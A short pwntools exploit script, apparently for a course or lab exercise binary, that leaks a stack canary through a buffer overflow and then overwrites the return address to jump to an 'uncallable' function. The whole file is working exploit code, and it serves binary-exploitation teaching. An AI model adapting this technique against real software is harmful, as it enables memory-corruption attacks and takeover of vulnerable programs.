#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise3a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main
b *welcome
b *check_authorization
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

e = ELF(exe)

if args.PAUSE:
    pause()


main_static_address = e.symbols['main']
uncallable_static_address = e.symbols['uncallable']

initial_output = r.recvuntil("password:\n", timeout=1)
log.info(f"initial output was: {initial_output}")

size_buffer = 124
offset = 24

#send A's to overflow the buffer and that the printf function does not stop before this
#then we know that the next 4 bytes are the canary, which we save for the next round of the
#while loop
leak_exploit = b"A"*(size_buffer-1)
r.sendline(leak_exploit)
leak = r.recvuntil("\n")
#the canary is the next 4 bytes
canary = r.recv(4)

exploit = b""
exploit += b"\x00"*(size_buffer)
exploit += canary
exploit += b"\x00"*offset
exploit += p64(uncallable_static_address)

r.sendline(exploit)

final_output = r.recvall() # receives all until EOF
log.info(f"final output was: {final_output}")